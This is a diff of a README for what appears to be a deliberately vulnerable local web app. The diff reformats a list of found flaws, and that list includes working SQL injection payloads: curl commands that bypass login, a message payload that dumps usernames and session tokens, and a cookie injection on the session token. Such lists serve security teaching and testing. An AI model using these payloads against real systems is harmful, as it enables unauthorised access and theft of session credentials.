@@ -25,7 +25,7 @@ Authors:
 
 List of vulnerabilities discovered:
 
-> [!NOTE]- SQL Injection Authentication Bypass (aCVE-2024-0001)
+> **SQL Injection Authentication Bypass (aCVE-2024-0001)**
 >
 > ```bash
 > curl 'http://0.0.0.0:5000/login' -X POST --data-raw "username=a' OR 1=1 --&password="
@@ -33,7 +33,7 @@ List of vulnerabilities discovered:
 > curl 'http://0.0.0.0:5000/login' -X POST --data-raw "username=' UNION select 1 from users; --&password="
 > ```
 
-> [!NOTE]- Stored XSS and SQL Injection Vulnerability by Execution of Arbitrary SQL Queries and JavaScript (aCVE-2024-0002).
+> **Stored XSS and SQL Injection Vulnerability by Execution of Arbitrary SQL Queries and JavaScript (aCVE-2024-0002)**
 >
 > Use these as the message:
 >
@@ -43,7 +43,7 @@ List of vulnerabilities discovered:
 > - `1', 1), ((SELECT GROUP_CONCAT(user || ':' || token, '<br>') FROM sessions), 1)--`
 
 
-> [!NOTE]- Credential Bypass via SQL Injection on Session Token (aCVE-2024-0003)
+> **Credential Bypass via SQL Injection on Session Token (aCVE-2024-0003)**
 >
 > ```bash
 > curl -L 'http://0.0.0.0:5000/home' -H "Cookie: session_token=' UNION SELECT id, username FROM users LIMIT 1 --" 
